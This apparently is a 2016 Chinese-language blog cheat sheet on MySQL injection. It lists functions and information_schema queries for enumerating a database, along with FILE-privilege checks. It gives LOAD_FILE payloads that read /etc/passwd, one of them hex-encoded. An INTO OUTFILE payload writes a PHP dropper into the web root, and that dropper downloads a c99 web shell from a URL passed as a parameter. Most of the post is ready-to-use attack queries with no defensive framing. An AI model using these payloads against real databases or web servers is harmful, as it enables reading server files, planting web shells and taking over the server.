---
title: "Mysql 注入"
date: 2016-04-21 11:50
---

## 常用函数

```
system_user()     系统用户名
user()            MYSQL用户名 
current_user()    当前用户名
session_user()    连接数据库的用户名
database()        当前数据库名
schema()          当前数据库名
version()         当前数据库版本信息
load_file()       MYSQL读取本地文件

@@datadir
@@hostname          服务器主机名
```

## information_schema

```
# 查看数据库服务器上的数据库
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA

# 查看某个数据库里面的数据表
SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema ='数据库名'

# 查看某个数据表里面的字段
#   默认当前数据库
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name ='表名'
#   指定数据库
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name ='表名' AND table_schema ='数据库名'
```

## 文件权限

查询用户读写文件操作权限：

```
# 需要root用户来执行 	MySQL 4/5
SELECT file_priv FROM mysql.user WHERE user = 'username';

# 普通用户都可以 	MySQL 5
SELECT grantee, is_grantable FROM information_schema.user_privileges WHERE privilege_type = 'file' AND grantee like '%username%'; 	
```

## load_file()

用户有文件操作权限则可以读取文件

```
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE(0x2F6574632F706173737764);
```

要求：

```
文件必须在服务器上。
LOAD_FILE()函数操作文件的当前目录是@@datadir 。
MySQL用户必须拥有对此文件读取的权限。
文件大小必须小于 max_allowed_packet。
@@max_allowed_packet的默认大小是1047552 字节
```

## 写文件

如果用户有文件操作权限可以写文件

```
INTO OUTFILE/DUMPFILE
```

```
SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'

http://localhost/get.php?f=shell.php&u=http://localhost/c99.txt
```

注：

```
INTO OUTFILE 不可以覆盖已存在的文件。
INTO OUTFILE 必须是最后一个查询。
引号是必须的，因为没有办法可以编码路径名
```
 
参考：

[乌云 MySql注入科普][1]

[1]: http://drops.wooyun.org/tips/123